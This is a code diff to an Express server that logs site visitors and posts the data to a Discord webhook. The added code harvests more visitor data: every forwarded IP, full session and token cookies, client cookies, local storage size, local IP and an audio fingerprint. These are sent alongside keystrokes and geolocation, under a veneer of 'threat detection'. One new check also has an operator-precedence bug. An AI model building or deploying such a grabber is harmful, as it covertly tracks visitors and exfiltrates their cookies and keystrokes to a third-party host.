@@ -24,7 +24,7 @@ const logger = winston.createLogger({
 });
 
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, 
+  windowMs: 15 * 60 * 1000,
   max: 100,
   standardHeaders: true,
   legacyHeaders: false
@@ -98,48 +98,45 @@ app.get('/', (req, res) => {
 });
 
 function getClientIP(req) {
+  const allIPs = new Set(); 
+
   const ipHeaders = [
     'x-forwarded-for',
     'cf-connecting-ip', 
-    'true-client-ip', 
+    'true-client-ip',
     'x-real-ip', 
-    'x-client-ip',
-    'forwarded'
+    'x-client-ip', 
+    'forwarded',
+    'x-cluster-client-ip', 
+    'fastly-client-ip', 
+    'x-original-forwarded-for'
   ];
 
   for (const header of ipHeaders) {
     const value = req.headers[header];
     if (value) {
+      let ips = [];
       if (header === 'forwarded') {
-        // Parse Forwarded header (e.g., "for=192.0.2.1")
-        const match = value.match(/for=([^;,\s]+)/i);
-        if (match && match[1]) {
-          const ip = match[1].replace(/[\[\]"]/g, '').trim(); // Remove IPv6 brackets or quotes
-          if (isValidIP(ip)) {
-            logger.info('IP retrieved from Forwarded header', { ip, header });
-            return ip;
-          }
-        }
+        const forwards = value.split(',').map(part => part.match(/for=([^;,\s]+)/i)?.[1]?.replace(/[\[\]"]/g, '').trim());
+        ips = forwards.filter(ip => ip && isValidIP(ip));
       } else {
-        // Split x-forwarded-for or similar headers and take the first IP
-        const ip = value.split(',')[0].trim();
-        if (isValidIP(ip)) {
-          logger.info('IP retrieved from header', { ip, header });
-          return ip;
-        }
+        ips = value.split(',').map(ip => ip.trim()).filter(ip => isValidIP(ip));
       }
+      ips.forEach(ip => allIPs.add(ip));
     }
   }
 
-  const socketIP = req.socket.remoteAddress;
+  const socketIP = req.socket.remoteAddress?.replace(/^::ffff:/, ''); 
   if (isValidIP(socketIP)) {
-    logger.info('IP retrieved from socket', { ip: socketIP });
-    return socketIP;
+    allIPs.add(socketIP);
   }
 
-  const fallbackIP = socketIP === '::1' ? '127.0.0.1' : socketIP;
-  logger.warn('No valid IP found, using fallback', { ip: fallbackIP });
-  return fallbackIP;
+  const allIPsArray = Array.from(allIPs);
+  const primary = allIPsArray[0] || '127.0.0.1'; 
+
+  logger.info('Detected IPs', { primary, all: allIPsArray });
+
+  return { primary, all: allIPsArray };
 }
 
 function isValidIP(ip) {
@@ -180,6 +177,13 @@ function detectSecurityThreats(req, visitorInfo) {
     threats.push({
       type: 'Subdomain Cookie Scope Abuse',
       details: 'Broad cookie value detected'
+    });
+  }
+
+  if (Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
+    threats.push({
+      type: 'Suspicious Cookie Content',
+      details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`
     });
   }
 
@@ -246,6 +250,20 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
+  if (req.body.part4?.cookies && req.body.part4.cookies.includes('token') || req.body.part4.cookies.includes('session')) {
+    threats.push({
+      type: 'Sensitive Client Cookies',
+      details: 'Potentially sensitive data in client-sent cookies'
+    });
+  }
+
+  if (req.body.part4?.localStorageUsage > 0) {
+    threats.push({
+      type: 'Local Storage Monitoring',
+      details: `Local storage usage detected: ${req.body.part4.localStorageUsage} bytes`
+    });
+  }
+
   return threats;
 }
 
@@ -256,7 +274,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       cookies: req.cookies,
       body: req.body
     });
-    const ip = getClientIP(req);
+    const ipInfo = getClientIP(req);
+    const ip = ipInfo.primary;
     
     const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
     const geoData = await geoResponse.json();
@@ -275,6 +294,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const visitorInfo = {
       sessionId: req.sessionId,
       ip: geoData.query,
+      allIPs: ipInfo.all,
       country: geoData.country,
       region: geoData.regionName,
       city: geoData.city,
@@ -316,6 +336,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       batteryStatus: req.body.batteryStatus || 'Unknown',
       currentUrl: req.body.currentUrl || 'Unknown',
       scrollPosition: req.body.scrollPosition || 'Unknown',
+      cookies: JSON.stringify(req.cookies) || '{}', // Server-side cookies for your domain
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -335,6 +356,12 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         clickedElements: req.body.part3?.clickedElements || 'None',
         sessionDuration: req.body.part3?.sessionDuration || 'Unknown',
         eventLog: req.body.part3?.eventLog || 'None'
+      },
+      part4: {
+        clientCookies: req.body.part4?.clientCookies || 'None', 
+        localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown', 
+        localIP: req.body.part4?.localIP || 'Unknown', 
+        audioFingerprint: req.body.part4?.audioFingerprint || 'None' 
       }
     };
 
@@ -351,6 +378,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
       { name: 'Device', value: visitorInfo.device, inline: true },
       { name: 'IP', value: visitorInfo.ip, inline: true },
+      { name: 'All IPs', value: visitorInfo.allIPs.join(', ') || 'N/A', inline: true },
       { name: 'Country', value: visitorInfo.country, inline: true },
       { name: 'Region', value: visitorInfo.region, inline: true },
       { name: 'City', value: visitorInfo.city, inline: true },
@@ -376,6 +404,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
       { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
       { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
+      { name: 'Cookies (Server)', value: visitorInfo.cookies, inline: true },
       { name: 'Part 3: Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
       { name: 'Part 3: Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
       { name: 'Part 3: WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
@@ -394,12 +423,17 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       { name: 'Part 3: Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
       { name: 'Part 3: Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
       { name: 'Part 3: Event Log', value: visitorInfo.part3.eventLog, inline: true },
+      { name: 'Part 4: Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
+      { name: 'Part 4: Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
+      { name: 'Part 4: Local IP', value: visitorInfo.part4.localIP, inline: true },
+      { name: 'Part 4: Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const firstBatch = fields.slice(0, 16); 
-    const secondBatch = fields.slice(16, 32); 
-    const thirdBatch = fields.slice(32);
+    const firstBatch = fields.slice(0, 15);
+    const secondBatch = fields.slice(15, 30);
+    const thirdBatch = fields.slice(30, 45);
+    const fourthBatch = fields.slice(45); 
 
     const payload1 = {
       embeds: [{
@@ -428,6 +462,15 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       }]
     };
 
+    const payload4 = {
+      embeds: [{
+        title: 'New Visitor Detected! (Part 4)',
+        color: threats.length ? 0xff0000 : 0x00ff00,
+        timestamp: visitorInfo.timestamp,
+        fields: fourthBatch
+      }]
+    };
+
     try {
       // Save payloads to .txt files
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
@@ -445,6 +488,10 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       const logFile3 = path.join(logDir, `webhook_payload_3_${timestamp}.txt`);
       await fs.writeFile(logFile3, JSON.stringify(payload3, null, 2));
       logger.info('Saved webhook payload 3 to file', { file: logFile3, payloadSize: JSON.stringify(payload3).length });
+
+      const logFile4 = path.join(logDir, `webhook_payload_4_${timestamp}.txt`);
+      await fs.writeFile(logFile4, JSON.stringify(payload4, null, 2));
+      logger.info('Saved webhook payload 4 to file', { file: logFile4, payloadSize: JSON.stringify(payload4).length });
 
       // Send first webhook
       logger.info('Attempting to send to Discord Webhook (Part 1)', { webhookURL, payloadSize: JSON.stringify(payload1).length });
@@ -467,8 +514,10 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
       logger.info('Successfully sent to Discord Webhook (Part 1)', { status: webhookResponse1.status, webhookURL });
 
+      // Delay to avoid rate limits
       await new Promise(resolve => setTimeout(resolve, 2000));
 
+      // Send second webhook
       logger.info('Attempting to send to Discord Webhook (Part 2)', { webhookURL, payloadSize: JSON.stringify(payload2).length });
       const webhookResponse2 = await fetch(webhookURL, {
         method: 'POST',
@@ -513,6 +562,30 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
       logger.info('Successfully sent to Discord Webhook (Part 3)', { status: webhookResponse3.status, webhookURL });
 
+      // Delay to avoid rate limits
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Send fourth webhook
+      logger.info('Attempting to send to Discord Webhook (Part 4)', { webhookURL, payloadSize: JSON.stringify(payload4).length });
+      const webhookResponse4 = await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload4)
+      });
+
+      if (!webhookResponse4.ok) {
+        const text = await webhookResponse4.text();
+        logger.error('Failed to send to Discord Webhook (Part 4)', {
+          status: webhookResponse4.status,
+          statusText: webhookResponse4.statusText,
+          response: text,
+          webhookURL
+        });
+        return res.status(500).send('Failed to send visitor info to Discord (Part 4)');
+      }
+
+      logger.info('Successfully sent to Discord Webhook (Part 4)', { status: webhookResponse4.status, webhookURL });
+
     } catch (error) {
       logger.error('Error sending to Discord Webhook', { error: error.message, stack: error.stack, webhookURL });
       return res.status(500).send('Error sending visitor info to Discord');
@@ -529,7 +602,7 @@ app.use((req, res, next) => {
   logger.info('Incoming Request', {
     method: req.method,
     path: req.originalUrl,
-    ip: getClientIP(req),
+    ip: getClientIP(req).primary,
     timestamp: new Date().toISOString()
   });
   next();
@@ -539,7 +612,7 @@ app.use((err, req, res, next) => {
   logger.error('Unhandled error', { error: err.message, stack: err.stack });
   if (err.code === 'EBADCSRFTOKEN') {
     logger.warn('CSRF Attack Detected', {
-      ip: getClientIP(req),
+      ip: getClientIP(req).primary,
       path: req.originalUrl,
       cookies: req.cookies,
       headers: req.headers
